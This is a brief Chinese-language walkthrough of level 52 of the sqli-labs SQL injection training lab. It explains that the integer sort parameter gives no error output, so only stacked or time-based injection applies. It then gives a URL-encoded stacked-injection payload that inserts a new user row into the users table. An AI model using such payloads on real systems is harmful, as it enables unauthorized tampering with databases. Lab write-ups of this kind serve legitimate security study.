## sql-labs第五十二关

该参数是整数型，且没有报错显示，只能堆叠注入或者延时注入

![](./img/77b3398c5f7c504b364f7ac4ba9332f3.png)



可用堆叠注入

~~~ cmd
?sort=1;insert%20into%20users(id,username,password)%20values%20(%2752%27,%27less38%27,%27hello%27)--+
~~~

![](./img/Less-52-01.PNG)